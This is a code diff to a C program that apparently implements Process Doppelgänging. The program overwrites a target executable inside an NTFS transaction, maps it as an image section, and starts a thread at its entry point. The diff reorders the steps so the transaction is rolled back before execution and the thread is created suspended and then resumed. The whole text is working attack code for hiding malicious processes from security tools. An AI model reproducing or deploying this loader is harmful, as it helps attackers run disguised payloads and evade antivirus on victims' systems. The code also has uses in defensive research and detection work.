@@ -123,14 +123,6 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 	printf("[+] Got ntdll.dll at 0x%llx\n", hNtdll);
-	NtCreateSection createSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
-
-	if (NULL == createSection)
-	{
-		DisplayErrorText(GetLastError());
-		return -1;
-	}
-	printf("[+] Got NtCreateSection at 0x%08p\n", createSection);
 
 	HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, L"doppelgang_test");
 	if (INVALID_HANDLE_VALUE == hTransaction)
@@ -175,7 +167,6 @@ int main(int argc, char *argv[])
 	}
 	printf("[+] Allocated 0x%x bytes\n", dwFileSize);
 
-	// Fix for 32-bit, ReadFile/WriteFile requires a DWORD pointer to receive number of bytes read/written.
 	DWORD dwBytes;
 	if (FALSE == ReadFile(hExe, buffer, dwFileSize, &dwBytes, NULL))
 	{
@@ -192,6 +183,15 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 	printf("[+] Overwrote %s in transcation\n", argv[1]);
+	
+	NtCreateSection createSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
+
+	if (NULL == createSection)
+	{
+		DisplayErrorText(GetLastError());
+		return -1;
+	}
+	printf("[+] Got NtCreateSection at 0x%08p\n", createSection);
 
 	ret = createSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
 	if (FALSE == NT_SUCCESS(ret))
@@ -200,6 +200,13 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 	printf("[+] Created a section with our injected process\n");
+
+	if (FALSE == RollbackTransaction(hTransaction))
+	{
+		DisplayErrorText(GetLastError());
+		return -1;
+	}
+	printf("[+] Rolled back the original %s\n", argv[1]);
 
 
 
@@ -246,6 +253,15 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 	printf("[+] Got NtCreateThreadEx 0x%08p\n", createThreadEx);
+
+	HANDLE hThread;
+	ret = createThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL, TRUE, 0, 0, 0, NULL);
+	printf("[+] Thread created with handle %x\n", hThread);
+	if (FALSE == NT_SUCCESS(ret))
+	{
+		DisplayErrorText(GetLastError());
+		return -1;
+	}
 
 
 	my_PRTL_USER_PROCESS_PARAMETERS ProcessParams = 0;
@@ -318,21 +334,23 @@ int main(int argc, char *argv[])
 	}
 	printf("[+] Writing our paramters to the process peb 0x%08x\n", peb);
 
-	HANDLE hThread;
-	ret = createThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL, FALSE, 0, 0, 0, NULL);
-	printf("[+] Thread created with handle %x\n", hThread);
+	NtResumeThread resumeThread = (NtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
+	if (NULL == resumeThread)
+	{
+		DisplayErrorText(GetLastError());
+		return -1;
+	}
+	printf("[+] Got NtResumeThread 0x%08p\n", resumeThread);
+
+	ret = resumeThread(hThread, NULL);
+	printf("[+] Thread resumed with handle %x\n", hThread);
 	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	if (FALSE == RollbackTransaction(hTransaction))
-	{
-		DisplayErrorText(GetLastError());
-		return -1;
-	}
-	printf("[+] Rolling back the original %s\n", argv[1]);
 
+	CloseHandle(hThread);
 	CloseHandle(hProcess);
 	CloseHandle(hExe);
 	CloseHandle(hTransactedFile);
